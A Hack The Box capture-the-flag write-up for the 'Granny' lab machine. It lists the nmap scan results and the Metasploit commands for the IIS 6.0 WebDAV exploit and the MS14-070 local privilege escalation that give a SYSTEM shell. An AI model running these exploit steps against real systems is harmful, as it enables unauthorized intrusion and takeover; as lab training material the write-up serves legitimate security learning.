# Granny

IP: `10.10.10.15`

## Nmap scan

```sh
nmap -A -T5 -p- 10.10.10.15
```

results

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 09:38 EDT
Nmap scan report for 10.10.10.15
Host is up (0.22s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Date: Sun, 12 Apr 2020 13:42:05 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.69 seconds
```

## Port analysis

Going to port 80, we see the same error message that was seen for grandpa. So let's also try the same method as we did for the Grandpa box.


## Metasploit WebDAV scan

```sh
msfconsole
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS 10.10.10.15
run
```

meterpreter shell spawned here. Now to escelate privelage just like grandpa

### Method 1

Getting system info:

```
Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 1 Hours, 6 Minutes, 58 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 756 MB
Page File: Max Size:       2,470 MB 
Page File: Available:      2,291 MB
Page File: In Use:         179 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

copying the info to `systeminfo.txt` and running

```sh
windows-exploit-suggester.py -d 2020-04-10-mssb.xls -i systeminfo.txt
```

### Method 2
Another way of searching for exploits in a meterpreter session is by using the suggester of metasploit

```sh
background # background the meterpreter session
search suggester
use multi/recon/local_exploit_suggester
set session <SESSION ID>
run
```

# Priv esc
Next, migrating to this process for a more stable meterpreter session:

```sh
2428  592   davcdata.exe
```

Now running the same exploit as grandpa MS-14-070

```sh
background # background the meterpreter session
# Using the rapid7 doc for MS14-070 exploit
use exploit/windows/local/ms14_070_tcpip_ioctl
set SESSION <meterpreter session id>
exploit
```

and we have our root shell.

